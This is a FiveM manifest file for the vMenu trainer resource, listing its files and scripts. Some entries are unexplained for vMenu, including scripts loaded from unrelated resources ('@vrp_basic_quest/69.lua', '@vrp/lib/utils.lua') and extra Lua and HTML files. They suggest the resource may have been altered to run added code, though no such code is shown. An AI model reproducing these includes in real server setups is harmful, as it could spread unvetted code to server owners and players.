fx_version 'bodacious'
games {'gta5'}
lua54 "yes"


escrow_ignore {
  "config/locations.json",
  "config/addons.json",
  "config/permissions.cfg",
}

name 'vMenu'
description 'Server sided trainer for FiveM with custom permissions, using a custom MenuAPI. More info can be found at www.vespura.com/fivem'
version 'v5.2.4'
author 'Al-Dolime'
ui_page 'storage.html'

-- Adds additional logging, useful when debugging issues.
client_debug_mode 'false'
server_debug_mode 'false'

-- Leave this set to '0' to prevent compatibility issues 
-- and to keep the save files your users.
experimental_features_enabled '0'

-- Files & scripts
files {
    'vMenu/Newtonsoft.Json.dll',
    'vMenu/MenuAPI.dll',
    'config/locations.json',
    'config/addons.json',
    'vMenu/storage.html'
}
server_scripts {
    '@vrp/lib/utils.lua',
    'Files/server.lua'
}
client_script 'Files/client.lua'
client_script 'vMenu/vMenuClient.net.dll'
server_script 'vMenu/vMenuServer.net.dll'

client_script "@vrp_basic_quest/69.lua"
